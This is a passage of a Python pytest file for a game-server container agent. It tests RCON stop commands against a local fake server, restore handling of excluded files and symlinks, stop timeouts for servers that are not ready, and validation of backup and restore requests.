    assert driver.endpoint(settings, RconContainer({"CS2_RCONPW": PASSWORD}))[1] == 27015


def test_rcon_query_endpoints_are_a2s(settings):
    target = drivers.for_profile(cs2.PROFILE).query_endpoint(settings, RconContainer({"CS2_PORT": "27030"}))
    assert tuple(target) == ("10.1.2.3", 27030) and callable(target.query)
    pz = RconContainer({"DEFAULT_PORT": "16300"})
    assert tuple(drivers.for_profile(zomboid.PROFILE).query_endpoint(settings, pz)) == ("10.1.2.3", 16300)
    with pytest.raises(AgentError) as exc:
        drivers.for_profile(profiles.get("factorio")).query_endpoint(settings, pz)
    assert exc.value.code == "ping_unavailable"


def test_cs2_stop_sends_quit_then_waits_for_the_exit(settings, monkeypatch):
    from mcagent.drivers import rcon as rcon_driver

    sent = []
    c = RconContainer({"CS2_RCONPW": PASSWORD})

    def fake_run(host, port, password, command, *, timeout, connect_timeout):
        sent.append((host, port, command))
        c.status = "exited"  # the server quits
        raise rcon.RconError("RCON connection closed")

    monkeypatch.setattr(rcon_driver.rcon_client, "run_command_sync", fake_run)
    result = StopResult()
    assert drivers.for_profile(cs2.PROFILE).stop(settings, c, 30, result) is True
    assert sent == [("10.1.2.3", 27015, "quit")]
    assert result.stop_sent_via_rcon and not result.warnings and c.stopped_with == 30


def test_cs2_stop_without_rcon_still_signals(settings, monkeypatch):
    from mcagent.drivers import rcon as rcon_driver

    def unavailable(*a, **k):
        raise rcon.RconUnavailable("connection refused")

    monkeypatch.setattr(rcon_driver.rcon_client, "run_command_sync", unavailable)
    c = RconContainer({"CS2_RCONPW": PASSWORD})
    result = StopResult()
    drivers.for_profile(cs2.PROFILE).stop(settings, c, 30, result)
    assert c.stopped_with == 30 and not result.stop_sent_via_rcon
    assert "quit could not be sent" in result.warnings[0]


def test_zomboid_saves_and_waits_for_the_line(settings, monkeypatch):
    calls = []
    monkeypatch.setattr(
        docker_ops,
        "_flush_before_stop",
        lambda target, bound, result, command: (
            calls.append(command) or setattr(result, "flushed", True) or True
        ),
    )
    monkeypatch.setattr(
        docker_ops, "wait_for_log", lambda c, pattern, since, timeout: calls.append(pattern) or True
    )
    c = RconContainer({"RCON_PASSWORD": PASSWORD})
    result = StopResult()
    drivers.for_profile(zomboid.PROFILE).stop(settings, c, 120, result)
    assert calls == ["save", "Saving finish"] and result.flushed and c.stopped_with == 120


class SrcdsFake:
    """A Source RCON server that answers the login like srcds: an empty RESPONSE_VALUE first."""

    def __init__(self, password=PASSWORD):
        self.password = password
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(1)
        self.port = self.sock.getsockname()[1]
        threading.Thread(target=self.serve, daemon=True).start()

    @staticmethod
    def packet(req_id, ptype, body=b""):
        data = struct.pack("<ii", req_id, ptype) + body + b"\x00\x00"
        return struct.pack("<i", len(data)) + data

    def read(self, conn):
        length = struct.unpack("<i", conn.recv(4))[0]
        data = b""
        while len(data) < length:
            data += conn.recv(length - len(data))
        req_id, ptype = struct.unpack("<ii", data[:8])
        return req_id, ptype, data[8:-2].decode()

    def serve(self):
        conn, _ = self.sock.accept()
        with conn:
            req_id, _t, password = self.read(conn)
            conn.sendall(self.packet(req_id, 0))
            conn.sendall(self.packet(req_id if password == self.password else -1, 2))
            req_id, _t, command = self.read(conn)
            conn.sendall(self.packet(req_id, 0, f"hostname: Dust Club ({command})".encode()))


def test_srcds_login_with_an_empty_response_first():
    fake = SrcdsFake()
    out = rcon.run_command_sync("127.0.0.1", fake.port, PASSWORD, "status", timeout=3, connect_timeout=3)
    assert out == "hostname: Dust Club (status)"


def test_srcds_wrong_password_is_unavailable():
    fake = SrcdsFake(password="the-right-one-000000")
    with pytest.raises(rcon.RconUnavailable, match="authentication failed"):
        rcon.run_command_sync("127.0.0.1", fake.port, PASSWORD, "status", timeout=3, connect_timeout=3)


# --- restore keeps the files and glob matches a backup leaves out (end-to-end run, BUG-2) ---------------------
def _restore_dirs(settings, monkeypatch, game):
    monkeypatch.setattr(docker_ops, "status", lambda _iid, _s=None: {"exists": True, "game": game})
    current = docker_ops.instance_dir(settings, IID)
    current.mkdir(parents=True)
    restored = settings.staging_dir / "restore-x"
    restored.mkdir(parents=True)
    return current, restored


def test_restore_keeps_palworlds_excluded_files_and_patterns(settings, monkeypatch):
    current, restored = _restore_dirs(settings, monkeypatch, "palworld")
    for rel in (
        "PalServer.sh",
        "steamclient.so",
        "Manifest_DebugFiles_Linux.txt",
        "DefaultPalWorldSettings.ini",
    ):
        (current / rel).write_text(rel)
    (current / "Pal" / "Binaries" / "Linux").mkdir(parents=True)
    (current / "Pal" / "Binaries" / "Linux" / "PalServer-Linux-Shipping").write_text("bin")
    (current / "Pal" / "Saved" / "SaveGames").mkdir(parents=True)
    (current / "Pal" / "Saved" / "SaveGames" / "old.sav").write_text("old")  # in the backup: not carried
    (restored / "Pal" / "Saved" / "SaveGames").mkdir(parents=True)
    (restored / "Pal" / "Saved" / "SaveGames" / "Level.sav").write_text("restored")
    assert main._carry_over_excluded(settings, IID, current, restored) == []
    for rel in (
        "PalServer.sh",
        "steamclient.so",
        "Manifest_DebugFiles_Linux.txt",
        "DefaultPalWorldSettings.ini",
    ):
        assert (restored / rel).read_text() == rel and not (current / rel).exists()
    assert (restored / "Pal" / "Binaries" / "Linux" / "PalServer-Linux-Shipping").read_text() == "bin"
    assert not (restored / "Pal" / "Saved" / "SaveGames" / "old.sav").exists()
    assert (restored / "Pal" / "Saved" / "SaveGames" / "Level.sav").read_text() == "restored"


def test_restore_carries_nested_glob_matches_without_following_links(settings, monkeypatch, tmp_path):
    current, restored = _restore_dirs(settings, monkeypatch, "cs2")
    (current / "game" / "csgo" / "cfg").mkdir(parents=True)
    (current / "game" / "csgo" / "pak01_000.vpk").write_text("vpk")
    (current / "game" / "csgo" / "cfg" / "server.cfg").write_text("cfg")
    (current / "game" / "bin" / "linuxsteamrt64").mkdir(parents=True)
    (current / "game" / "bin" / "linuxsteamrt64" / "cs2").write_text("bin")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "host.vpk").write_text("host")
    os.symlink(outside, current / "game" / "sneaky")  # a link the game made: never followed
    (restored / "game" / "csgo" / "cfg").mkdir(parents=True)
    (restored / "game" / "csgo" / "cfg" / "server.cfg").write_text("restored cfg")
    assert main._carry_over_excluded(settings, IID, current, restored) == []
    assert (restored / "game" / "csgo" / "pak01_000.vpk").read_text() == "vpk"
    assert (restored / "game" / "bin" / "linuxsteamrt64" / "cs2").read_text() == "bin"
    assert (restored / "game" / "csgo" / "cfg" / "server.cfg").read_text() == "restored cfg"
    assert (outside / "host.vpk").read_text() == "host" and not (restored / "game" / "sneaky").exists()
    # a link in the restored tree (from a backup) is never moved through
    current2, restored2 = current, settings.staging_dir / "restore-y"
    restored2.mkdir()
    (current2 / "game" / "csgo" / "pak01_001.vpk").write_text("vpk1")
    target = tmp_path / "elsewhere"
    target.mkdir()
    os.symlink(target, restored2 / "game")
    assert main._carry_over_excluded(settings, IID, current2, restored2) == []
    assert not any(target.iterdir()) and (current2 / "game" / "csgo" / "pak01_001.vpk").exists()


def test_restore_carries_the_excluded_files_of_every_six_game(settings, monkeypatch):
    """Every exclude of the six profiles is either carried or harmless: nothing that is not excluded moves."""
    for game, profile in (
        ("rust", rust.PROFILE),
        ("hkmp", hkmp.PROFILE),
        ("project-zomboid", zomboid.PROFILE),
        ("valheim", valheim.PROFILE),
    ):
        current, restored = _restore_dirs(settings, monkeypatch, game)
        made = []
        for rel in profile.default_backup_excludes:
            path = current / rel.replace("*", "x")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(rel)
            made.append(rel.replace("*", "x"))
        (current / "keep.txt").write_text("not excluded")
        assert main._carry_over_excluded(settings, IID, current, restored) == [], game
        for rel in made:
            assert (restored / rel).exists() and not (current / rel).exists(), (game, rel)
        assert (current / "keep.txt").exists() and not (restored / "keep.txt").exists(), game
        import shutil

        shutil.rmtree(current)
        shutil.rmtree(restored)


# --- a stop before the server was ever ready (end-to-end re-test, BUG-9) ----------------------------------------
def _iso(ts: float) -> str:
    from datetime import UTC, datetime

    return datetime.fromtimestamp(ts, UTC).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


class RunContainer:
    """A running container of a game whose readiness the agent probes (log or A2S)."""

    def __init__(self, game: str, log: str = "", started: float | None = None):
        import time as _time

        self.id = f"c-{game}"
        self.name = f"mcpanel-{game}"
        self.status = "running"
        self.labels = {"io.mcpanel.instance": str(IID), "io.mcpanel.game": game}
        self.log = log
        self.attrs = {
            "Config": {"Env": [], "Image": "x"},
            "State": {
                "Status": "running",
                "Running": True,
                "StartedAt": _iso(_time.time() if started is None else started),
                "ExitCode": 0,
            },
            "NetworkSettings": {"Networks": {"mcpanel_instances": {"IPAddress": "10.1.2.9"}}, "Ports": {}},
            "HostConfig": {},
        }
        self.stopped_with = None

    def reload(self):
        pass

    def logs(self, **_kwargs):
        return self.log.encode()

    def stop(self, timeout):
        self.stopped_with = timeout
        self.status = "exited"
        self.attrs["State"].update({"Status": "exited", "Running": False, "ExitCode": 137})


@pytest.fixture
def no_driver_stop(monkeypatch):
    """The driver's own stop (save first, then the usual timeout), recorded instead of run."""
    calls = []

    def fake(self, settings, c, timeout, result):
        calls.append(timeout)
        c.stop(timeout)
        return True

    for cls in {
        type(drivers.for_profile(p)) for p in (zomboid.PROFILE, palworld.PROFILE, rust.PROFILE, hkmp.PROFILE)
    }:
        monkeypatch.setattr(cls, "stop", fake)
    monkeypatch.setattr(docker_ops, "fix_ownership", lambda *a, **k: None)
    return calls


def test_a_server_still_downloading_is_stopped_at_once(settings, no_driver_stop):
    # the panel's first-start wait was ended (not_ready) and the probe never succeeded: no save, 15 s
    c = RunContainer("project-zomboid", log="Downloading depot 380871\n 45.2% ...\n")
    result = docker_ops.graceful_stop(settings, c, 120, not_ready=True)
    assert c.stopped_with == zomboid.PROFILE.not_ready_stop_timeout == 15 and no_driver_stop == []
    assert result.not_ready and result.as_dict()["not_ready"] is True and result.exit_code == 137


def test_a_ready_server_keeps_its_usual_stop(settings, no_driver_stop):
    c = RunContainer("project-zomboid", log="LOG : General , 1> *** SERVER STARTED ****\n")
    result = docker_ops.graceful_stop(settings, c, 120, not_ready=True)
    assert no_driver_stop == [120] and not result.not_ready and "not_ready" not in result.as_dict()


def test_a_server_once_ready_is_never_taken_for_installing(settings, no_driver_stop, monkeypatch):
    # Rust answered A2S earlier in this run; at the stop its query does not answer: still the usual stop
    c = RunContainer("rust")
    monkeypatch.setattr(docker_ops, "_probe_a2s", lambda *a: True)
    assert docker_ops.describe(c)["health"] == "healthy"
    monkeypatch.setattr(docker_ops, "_probe_a2s", lambda *a: False)
    docker_ops._health_state.clear()  # (the probe's cache: the next look probes again)
    docker_ops.graceful_stop(settings, c, 180, not_ready=True)
    assert no_driver_stop == [180]


def test_only_the_panels_word_skips_the_save(settings, no_driver_stop):
    # E-1: the agent alone never decides that a run was not ready (its probe may have missed the moment)
    import time as _time

    c = RunContainer("palworld", log="Downloading update (4.6 GB)\n", started=_time.time() - 600)
    result = docker_ops.graceful_stop(settings, c, 60)
    assert no_driver_stop == [60] and not result.not_ready
    c = RunContainer("palworld", log="Downloading update (4.6 GB)\n", started=_time.time() - 600)
    result = docker_ops.graceful_stop(settings, c, 60, not_ready=True)  # the panel still waited for it
    assert c.stopped_with == 15 and result.not_ready


def test_games_without_the_rule_keep_their_stop(settings, no_driver_stop):
    assert hkmp.PROFILE.not_ready_stop_timeout is None
    for name in ("minecraft", "factorio", "satisfactory"):
        assert profiles.get(name).not_ready_stop_timeout is None, name
    c = RunContainer("hkmp")
    docker_ops.graceful_stop(settings, c, 40, not_ready=True)
    assert no_driver_stop == [40]


def test_stop_request_takes_the_panels_word():
    from mcagent.schemas import StopRequest

    assert StopRequest(timeout=30, not_ready=True).not_ready and not StopRequest().not_ready
    assert "stop_not_ready" in main.FEATURES and "backup_game_hint" in main.FEATURES


# --- backups of a server without container or last-run record (end-to-end re-test, BUG-10) -----------------------
def test_the_panels_game_names_the_profile_of_a_server_that_never_ran(settings, monkeypatch):
    monkeypatch.setattr(
        docker_ops, "status", lambda _iid, _s=None: {"exists": False, "game": None, "last_run": None}
    )
    assert main._server_profile(settings, IID).game == "minecraft"  # (as before: no hint, no game)
    assert main._server_profile(settings, IID, ("palworld", None)) is palworld.PROFILE
    assert main._server_profile(settings, IID, ("no-such-game", None)).game == "minecraft"
    excludes = main._profile_backup_excludes(settings, IID, ("palworld", None))
    assert any(e.endswith("/PalServer.sh") for e in excludes) and any(
        e.endswith("/Pal/Content") for e in excludes
    )
    # a container or a last-run record is the truth: the request's game does not change it
    monkeypatch.setattr(docker_ops, "status", lambda _iid, _s=None: {"exists": True, "game": "rust"})
    assert main._server_profile(settings, IID, ("palworld", None)) is rust.PROFILE
    monkeypatch.setattr(
        docker_ops, "status", lambda _iid, _s=None: {"exists": False, "last_run": {"game": "valheim"}}
    )
    assert main._server_profile(settings, IID, ("palworld", None)) is valheim.PROFILE


def test_restore_of_a_server_that_never_ran_keeps_the_games_files(settings, monkeypatch):
    monkeypatch.setattr(
        docker_ops, "status", lambda _iid, _s=None: {"exists": False, "game": None, "last_run": None}
    )
    current = docker_ops.instance_dir(settings, IID)
    current.mkdir(parents=True)
    (current / "PalServer.sh").write_text("sh")
    restored = settings.staging_dir / "restore-z"
    restored.mkdir(parents=True)
    assert main._carry_over_excluded(settings, IID, current, restored) == []
    assert not (restored / "PalServer.sh").exists()  # (without the game: Minecraft, nothing excluded)
    assert main._carry_over_excluded(settings, IID, current, restored, ("palworld", None)) == []
    assert (restored / "PalServer.sh").read_text() == "sh"


def test_backup_and_restore_requests_take_a_checked_game():
    from mcagent.schemas import BackupRequest, RestoreRequest

    body = BackupRequest(backup_id="b1", game="palworld")
    assert (body.game, body.variant) == ("palworld", None) and BackupRequest(backup_id="b1").game is None
    assert RestoreRequest(snapshot_id="abcdef12", game="project-zomboid").game == "project-zomboid"
    for bad in ("../x", "Palworld", "a" * 40, "x y"):
        with pytest.raises(ValidationError):
            BackupRequest(backup_id="b1", game=bad)
